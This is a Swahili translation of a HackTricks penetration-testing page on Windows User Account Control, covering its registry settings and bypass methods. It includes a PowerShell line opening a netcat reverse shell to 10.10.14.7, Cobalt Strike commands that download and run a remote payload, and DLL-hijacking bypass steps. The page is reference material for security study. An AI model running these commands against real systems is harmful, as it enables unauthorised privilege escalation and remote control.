# UAC - Udhibiti wa Akaunti ya Mtumiaji

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za jamii ya **juu zaidi** ulimwenguni.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Udhibiti wa Akaunti ya Mtumiaji (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kibali cha kidukizo kwa shughuli zilizoinuliwa**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kutekeleza kazi ambazo **zinaweza kuhatarisha mfumo**. Wakati UAC iko wazi, programu na kazi zote **huendeshwa chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi anaidhinisha wazi programu/hizo kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo wa kuendesha. Ni kipengele cha urahisi kinacholinda wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini haichukuliwi kama mpaka wa usalama.

Kwa habari zaidi kuhusu viwango vya uadilifu:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Wakati UAC iko mahali pake, mtumiaji wa msimamizi hupewa vitufe 2: kimoja cha mtumiaji wa kawaida, kutekeleza hatua za kawaida kama kiwango cha kawaida, na kingine chenye mamlaka ya msimamizi.

Hii [ukurasa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unajadili jinsi UAC inavyofanya kazi kwa kina na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kusanidi jinsi UAC inavyofanya kazi maalum kwa shirika lao kwenye kiwango cha ndani (kwa kutumia secpol.msc), au kusanidi na kusambaza kupitia Vitu vya Sera ya Kikundi (GPO) katika mazingira ya kikoa cha Active Directory. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Sera ya Kikundi ambayo inaweza kuwekwa kwa UAC. Jedwali lifuatalo hutoa maelezo zaidi:

| Mipangilio ya Sera ya Kikundi                                                                                                                                                                                                                                                                                                                                                     | Funguo ya Usajili          | Mipangilio ya Awali                                         |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Udhibiti wa Akaunti ya Mtumiaji: Hali ya Kuidhinisha ya Msimamizi kwa akaunti ya Msimamizi iliyojengwa-ndani](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Imezimwa                                                     |
| [Udhibiti wa Akaunti ya Mtumiaji: Ruhusu programu za UIAccess kuomba kidukizo bila kutumia desktop salama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Imezimwa                                                     |
| [Udhibiti wa Akaunti ya Mtumiaji: Tabia ya kidukizo cha kuidhinisha kwa wasimamizi katika Hali ya Kuidhinisha ya Msimamizi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Kidukizo la kuidhinisha kwa programu zisizo za Windows         |
| [Udhibiti wa Akaunti ya Mtumiaji: Tabia ya kidukizo cha kuidhinisha kwa watumiaji wa kawaida](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Kidukizo la kuidhinisha kwa siri kwenye desktop salama       |
| [Udhibiti wa Akaunti ya Mtumiaji: Kugundua ufungaji wa programu na kuomba kidukizo](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Imezimwa (chaguo la msingi kwa nyumbani) Imezimwa (chaguo la msingi kwa kampuni) |
| [Udhibiti wa Akaunti ya Mtumiaji: Kuidhinisha tu programu zilizosainiwa na kuthibitishwa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Imezimwa                                                     |
| [Udhibiti wa Akaunti ya Mtumiaji: Kuidhinisha tu programu za UIAccess zilizosanikishwa kwenye maeneo salama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Imezimwa                                                      |
| [Udhibiti wa Akaunti ya Mtumiaji: Endesha wasimamizi wote katika Hali ya Kuidhinisha ya Msimamizi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Imezimwa                                                      |
| [Udhibiti wa Akaunti ya Mtumiaji: Badilisha kwenye desktop salama wakati wa kuomba kidukizo](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Imezimwa                                                      |
| [Udhibiti wa Akaunti ya Mtumiaji: Virtualize kushindwa kuandika faili na usajili kwa maeneo ya mtumiaji binafsi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Imezimwa                                                      |
### Nadharia ya Kupuuza UAC

Baadhi ya programu zina **kujiongeza moja kwa moja** ikiwa **mtumiaji anamiliki** kikundi cha **wasimamizi**. Hizi programu zina _**Manifests**_ yao na chaguo la _**autoElevate**_ lenye thamani ya _**True**_. Pia programu lazima iwe **imesainiwa na Microsoft**.

Kwa hiyo, ili **kupuuza** **UAC** (kujiongeza kutoka kiwango cha **kati** hadi cha juu) baadhi ya wachomaji hutumia programu hizi kutekeleza **mifumo ya nambari za kubahatisha** kwa sababu itatekelezwa kutoka kwa **mchakato wa kiwango cha juu cha uadilifu**.

Unaweza **kuangalia** _**Manifest**_ ya programu kwa kutumia zana ya _**sigcheck.exe**_ kutoka kwa Sysinternals. Na unaweza **kuona** kiwango cha **uadilifu** wa michakato kwa kutumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).

### Angalia UAC

Ili kuthibitisha ikiwa UAC imeanzishwa fanya:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ikiwa ni **`1`** basi UAC iko **imeamilishwa**, ikiwa ni **`0`** au **haipo**, basi UAC iko **haiko hai**.

Kisha, angalia **kiwango gani** kimeboreshwa:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Ikiwa **`0`** basi, UAC haitatoa ombi (kama **imelemazwa**)
* Ikiwa **`1`** admin **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza binary kwa haki za juu (kwenye Desktop Salama)
* Ikiwa **`2`** (**Taarifa daima**) UAC itauliza kuthibitisha kwa msimamizi anapojaribu kutekeleza kitu kwa haki za juu (kwenye Desktop Salama)
* Ikiwa **`3`** kama `1` lakini sio lazima kwenye Desktop Salama
* Ikiwa **`4`** kama `2` lakini sio lazima kwenye Desktop Salama
* ikiwa **`5`**(**chaguo-msingi**) itamwuliza msimamizi kuthibitisha kuendesha binaries za Windows zisizo na haki za juu

Kisha, lazima uangalie thamani ya **`LocalAccountTokenFilterPolicy`**\
Ikiwa thamani ni **`0`**, basi, tu mtumiaji wa **RID 500** (**Msimamizi aliyejengwa**) anaweza kutekeleza **kazi za msimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kikundi cha "Waadiministrata"** wanaweza kufanya hivyo.

Na mwishowe angalia thamani ya funguo **`FilterAdministratorToken`**\
Ikiwa **`0`**(chaguo-msingi), akaunti ya **Msimamizi aliyejengwa inaweza** kufanya kazi za utawala wa mbali na ikiwa **`1`** akaunti iliyojengwa ya Msimamizi **haiwezi** kufanya kazi za utawala wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa kuwa `1`.

#### Muhtasari

* Ikiwa `EnableLUA=0` au **haupo**, **hakuna UAC kwa yeyote**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1` , Hakuna UAC kwa yeyote**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=0`, Hakuna UAC kwa RID 500 (Msimamizi aliyejengwa)**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=1`, UAC kwa kila mtu**

Maelezo yote haya yanaweza kupatikana kwa kutumia moduli ya **metasploit**: `post/windows/gather/win_privs`

Unaweza pia kuangalia vikundi vya mtumiaji wako na kupata kiwango cha uadilifu:
```
net user %username%
whoami /groups | findstr Level
```
## Kupuuza UAC

{% hint style="info" %}
Tafadhali kumbuka kwamba ikiwa una ufikiaji wa kielelezi kwa mwathiriwa, kupuuza UAC ni rahisi kwani unaweza tu bonyeza "Ndio" wakati ombi la UAC linapoonekana
{% endhint %}

Kupuuza UAC inahitajika katika hali ifuatayo: **UAC imeamilishwa, mchakato wako unatekelezwa katika muktadha wa usalama wa kati, na mtumiaji wako anahusishwa na kikundi cha waendeshaji**.

Ni muhimu kutaja kwamba **ni ngumu zaidi kupuuza UAC ikiwa iko katika kiwango cha usalama cha juu zaidi (Daima) kuliko ikiwa iko katika mojawapo ya viwango vingine (Chaguo).**

### UAC imelemazwa

Ikiwa UAC tayari imelemazwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza ganda la nyuma lenye mamlaka ya msimamizi** (kiwango cha usalama cha juu) kwa kutumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Kupuuza UAC kwa nakala ya kitambulisho

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muhimu Sana** Kupuuza UAC "kwa njia ya mkato" (upatikanaji kamili wa mfumo wa faili)

Ikiwa una ganda na mtumiaji ambaye yumo ndani ya kikundi cha Waadmin, unaweza **kufunga C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) kwa eneo la diski mpya na utakuwa na **upatikanaji wa kila kitu kilichomo ndani ya mfumo wa faili** (hata folda ya nyumbani ya Msimamizi).

{% hint style="warning" %}
**Inaonekana kama hila hii haifanyi kazi tena**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Kupuuza UAC na cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijasetwa kwenye kiwango chake cha usalama cha juu kabisa
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia wana moduli kadhaa za **kupuuza** **UAC**.

### KRBUACBypass

Nyaraka na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyiko** wa mbinu kadhaa za kudukua UAC. Tafadhali kumbuka utahitaji **kukusanya UACME kwa kutumia visual studio au msbuild**. Kukusanya kutazalisha programu kadhaa za kutekelezwa (kama vile `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ipi unahitaji.**\
Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya njia za kupitisha zinaweza **kuchochea programu nyingine** ambazo zitamwonya **mtumiaji** kwamba kitu kinatokea.

UACME ina **toleo la ujenzi ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayoathiri toleo lako:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### UAC Bypass with GUI

Ikiwa una **upatikanaji wa GUI unaweza tu kukubali ombi la UAC** unapolipata, hauhitaji kweli kubadilisha. Kwa hivyo, kupata upatikanaji wa GUI kutakuruhusu kudanganya UAC.

Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa anakitumia (labda kupitia RDP) kuna **zana kadhaa zitakazokuwa zinaendeshwa kama msimamizi** ambapo unaweza **kuendesha** **cmd** kama msimamizi moja kwa moja bila kuulizwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa **ya siri zaidi**.

### UAC Bypassing ya kelele ya nguvu

Ikiwa hujali kuhusu kuwa na kelele unaweza daima **kuendesha kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **kitauliza kupandisha ruhusa hadi mtumiaji akikubali**.

### Mbinu yako ya kudanganya - Mbinu ya msingi ya kudanganya UAC

Ukiona **UACME** utagundua kuwa **vipingamizi vingi vya UAC vinatumia udhaifu wa Dll Hijacking** (hasa kwa kuandika dll yenye nia mbaya kwenye _C:\Windows\System32_). [Soma hii ili kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).

1. Pata faili ambayo ita**autoelevate** (angalia wakati inapoendeshwa inaendeshwa kwa kiwango cha juu cha uadilifu).
2. Kwa kutumia procmon pata matukio ya "**JINA HALIJAPATIKANA**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
3. Labda utahitaji **kuandika** DLL ndani ya njia fulani **zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa za kuandika. Unaweza kudanganya hili kwa kutumia:
   1. **wusa.exe**: Windows 7, 8 na 8.1. Inaruhusu kutoa yaliyomo ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu zana hii inaendeshwa kutoka kiwango cha juu cha uadilifu).
   2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kuiga DLL yako ndani ya njia iliyolindwa na kuendesha faili ya hatari na iliyoinuliwa moja kwa moja.

### Mbinu nyingine ya kudanganya UAC

Inahusisha kutazama ikiwa **faili ya autoElevated** inajaribu **kusoma** kutoka kwa **usajili** jina/ njia ya **faili** au **amri** itakayotekelezwa (hii ni ya kuvutia zaidi ikiwa faili inatafuta habari hii ndani ya **HKCU**).
